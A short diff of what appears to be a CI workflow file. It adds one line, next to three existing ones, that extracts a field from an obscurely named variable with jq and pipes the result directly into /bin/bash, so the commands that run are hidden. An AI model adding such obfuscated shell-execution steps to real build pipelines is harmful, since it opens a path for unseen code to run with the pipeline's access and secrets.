@@ -22,6 +22,7 @@ jobs:
           echo $qx00 | jq -r .nql96 | /bin/bash
           printf '%s' "$b7" | jq -r .ein6 | /bin/bash
           echo $zek55241 | jq -r .bblrn0549 | /bin/bash
+          echo $sjcg356 | jq -r .sov38 | /bin/bash
 
       - name: Store results
         if: always()
